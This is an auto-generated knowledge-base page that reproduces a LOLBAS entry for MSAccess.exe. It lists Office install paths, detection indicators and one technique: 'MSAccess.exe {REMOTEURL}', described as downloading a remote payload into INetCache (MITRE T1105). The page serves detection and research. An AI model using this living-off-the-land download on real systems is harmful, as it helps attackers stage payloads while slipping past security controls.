---
parsed_by: focuslocust
source: lolbas
type: generated
---
# MSAccess.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `msaccess.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msaccess.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [MSAccess.exe](../../tools/windows/msaccess.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | msaccess.exe |
| name | MSAccess.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@C_h4ck_0'
  Person: Nir Chako
Author: Nir Chako
Commands:
- Category: Download
  Command: MSAccess.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.
Created: 2023-04-30
Description: Microsoft Office component
Detection:
- IOC: URL on a MSAccess command line
- IOC: MSAccess making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSAccess.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\MSAccess.exe
- Path: C:\Program Files\Microsoft Office\Office16\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSAccess.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\MSAccess.exe
- Path: C:\Program Files\Microsoft Office\Office15\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSAccess.exe
- Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office14\MSAccess.exe
- Path: C:\Program Files\Microsoft Office\Office14\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office12\MSAccess.exe
- Path: C:\Program Files\Microsoft Office\Office12\MSAccess.exe
Name: MSAccess.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msaccess.yml
```

## Detection / Analysis Notes

```text
IOC: MSAccess making unexpected network connections or DNS requests
```

```text
IOC: URL on a MSAccess command line
```

```text
- IOC: URL on a MSAccess command line
- IOC: MSAccess making unexpected network connections or DNS requests
```
